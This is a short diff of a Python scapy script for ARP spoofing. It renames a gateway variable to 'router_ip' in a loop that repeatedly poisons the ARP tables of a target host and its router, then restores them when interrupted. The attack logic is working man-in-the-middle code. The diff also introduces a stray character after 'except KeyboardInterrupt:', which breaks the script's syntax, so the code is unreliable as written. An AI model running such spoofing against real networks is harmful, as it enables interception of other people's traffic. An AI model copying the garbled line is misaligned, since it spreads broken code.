@@ -19,17 +19,17 @@ def restore(dst_ip, src_ip):
     scapy.send(packet, count=4, verbose=False)
 
 target_ip = "10.0.2.15"
-gateway_ip = "10.0.2.1"
+router_ip = "10.0.2.1"
 packets_amount = 0
 
 try:
     while True:
-        spoof(target_ip, gateway_ip)
-        spoof(gateway_ip, target_ip)
+        spoof(target_ip, router_ip)
+        spoof(router_ip, target_ip)
         packets_amount+=2
         print("\r[+] Packets sent: ", str(packets_amount), end="")
         time.sleep(2)
-except KeyboardInterrupt:
+except KeyboardInterrupt:d
     print("\n[+] Program has been stopped, ARP tables will be reseted")
-    restore(target_ip, gateway_ip)
-    restore(gateway_ip, target_ip)
+    restore(target_ip, router_ip)
+    restore(router_ip, target_ip)
